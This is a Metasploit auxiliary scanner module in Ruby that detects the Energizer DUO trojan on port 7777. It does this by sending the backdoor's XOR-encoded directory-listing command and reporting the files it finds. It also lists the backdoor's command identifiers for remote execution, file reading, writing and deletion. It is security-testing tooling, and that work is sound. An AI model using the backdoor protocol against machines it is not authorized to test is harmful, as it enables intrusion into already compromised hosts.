##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Energizer DUO Trojan Scanner',
      'Description' => 'Detect instances of the Energizer DUO trojan horse software on port 7777',
      'Author'      => 'hdm',
      'References'  =>
        [
          ['CVE', '2010-0103'],
          ['OSVDB', '62782'],
          ['US-CERT-VU', '154421']
        ],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(7777),
      ], self.class)
  end

  def trojan_encode(str)
    str.unpack("C*").map{|c| c ^ 0xE5}.pack("C*")
  end

  def trojan_command(cmd)
    cid = ""

    case cmd
    when :exec
      cid = "{8AF1C164-EBD6-4b2b-BC1F-64674E98A710}"
    when :dir
      cid = "{0174D2FC-7CB6-4a22-87C7-7BB72A32F19F}"
    when :write
      cid = "{98D958FC-D0A2-4f1c-B841-232AB357E7C8}"
    when :read
      cid = "{F6C43E1A-1551-4000-A483-C361969AEC41}"
    when :nop
      cid = "{783EACBF-EF8B-498e-A059-F0B5BD12641E}"
    when :find
      cid = "{EA7A2EB7-1E49-4d5f-B4D8-D6645B7440E3}"
    when :yes
      cid = "{E2AC5089-3820-43fe-8A4D-A7028FAD8C28}"
    when :runonce
      cid = "{384EBE2C-F9EA-4f6b-94EF-C9D2DA58FD13}"
    when :delete
      cid = "{4F4F0D88-E715-4b1f-B311-61E530C2C8FC}"
    end

    trojan_encode(
      [0x27].pack("V") + cid  + "\x00"
    )
  end

  def run_host(ip)

    begin

    connect
    sock.put(trojan_command(:dir))
    sock.put(
      trojan_encode(
        [4].pack("V") + "C:\\\x00\x00"
      )
    )

    lbuff = sock.get_once(4, 5)
    if(not lbuff)
      print_error("#{ip}:#{rport} UNKNOWN: No response to the directory listing request")
      disconnect
      return
    end

    len   = trojan_encode(lbuff).unpack("V")[0]
    dbuff = sock.get_once(len, 30)
    data  = trojan_encode(dbuff)
    files = data.split("|").map do |x|
      if x[0,2] == "?1"
        ["D", x[2,x.length-2]]
      else
        ["F", x]
      end
    end

    # Required to prevent the server from spinning a loop
    sock.put(trojan_command(:nop))

    print_status("#{ip}:#{rport} FOUND: #{files.inspect}")
    ## Add Report
    report_note(
      :host   => ip,
      :proto  => 'tcp',
      :port   => datastore['RPORT'],
      :type   => 'Energizer DUO Trojan',
      :data   => files.inspect
    )
    disconnect

    rescue ::Interrupt
      raise $!
    rescue ::Rex::ConnectionError, ::IOError
    end

  end
end
